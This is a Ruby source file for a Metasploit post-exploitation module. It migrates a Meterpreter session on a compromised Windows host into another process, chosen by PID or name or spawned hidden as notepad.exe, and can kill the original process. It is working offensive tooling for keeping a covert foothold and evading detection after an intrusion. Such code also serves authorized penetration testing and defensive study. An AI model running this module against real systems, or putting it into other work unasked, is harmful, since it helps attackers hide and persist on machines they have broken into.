##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Windows Manage Process Migration',
      'Description'   => %q{ This module will migrate a Meterpreter session from one process
        to another. A given process PID to migrate to or the module can spawn one and
        migrate to that newly spawned process.},
      'License'       => MSF_LICENSE,
      'Author'        => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))

    register_options(
      [
        OptBool.new(   'SPAWN',[ false,'Spawn process to migrate to. If name for process not given notepad.exe is used.', true]),
        OptInt.new(    'PID',  [false, 'PID of process to migrate to.']),
        OptString.new( 'NAME', [false, 'Name of process to migrate to.']),
        OptBool.new(   'KILL', [false, 'Kill original process for the session.', false])
      ])
  end

  # Run Method for when run command is issued
  def run
    print_status("Running module against #{sysinfo['Computer']}")

    server = session.sys.process.open
    original_pid = server.pid
    print_status("Current server process: #{server.name} (#{server.pid})")

    target_pid = nil

    if datastore['SPAWN']
      print_status("Spawning notepad.exe process to migrate to")
      target_pid = create_temp_proc
    elsif datastore['PID']
      target_pid = datastore['PID']
    elsif datastore['NAME']
      target_pid = session.sys.process[datastore['NAME']]
    end

    if not target_pid or not has_pid?(target_pid)
      print_error("Process or PID not found")
      return
    end

    begin
      print_good("Migrating to #{target_pid}")
      session.core.migrate(target_pid)
      print_good("Successfully migrated to process #{target_pid}")
    rescue ::Exception => e
      print_error("Could not migrate in to process.")
      print_error("Exception: #{e.class} : #{e}")
    end

    if datastore['KILL']
      print_status("Killing original process with PID #{original_pid}")
      session.sys.process.kill(original_pid)
      print_good("Successfully killed process with PID #{original_pid}")
    end
  end

  # Creates a temp notepad.exe to migrate to depending the architecture.
  def create_temp_proc()
    # Use the system path for executable to run
    cmd = "notepad.exe"
    # run hidden
    proc = session.sys.process.execute(cmd, nil, {'Hidden' => true })
    return proc.pid
  end
end
